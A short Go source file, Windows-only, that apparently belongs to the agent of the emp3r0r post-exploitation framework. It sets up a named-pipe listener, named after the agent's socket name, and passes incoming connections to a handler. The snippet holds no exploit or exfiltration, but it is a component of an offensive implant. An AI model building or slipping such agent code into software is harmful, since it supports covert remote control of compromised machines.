//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"

	"github.com/Microsoft/go-winio"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
)

func socketListen() {
	pipe_config := &winio.PipeConfig{
		SecurityDescriptor: "",
		MessageMode:        true,
		InputBufferSize:    1024,
		OutputBufferSize:   1024,
	}
	ln, err := winio.ListenPipe(
		fmt.Sprintf(`\\.\pipe\%s`, agent.RuntimeConfig.SocketName),
		pipe_config)
	if err != nil {
		log.Fatalf("Listen on %s: %v", agent.RuntimeConfig.SocketName, err)
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept: %v", err)
			continue
		}
		go socket_server(conn)
	}
}
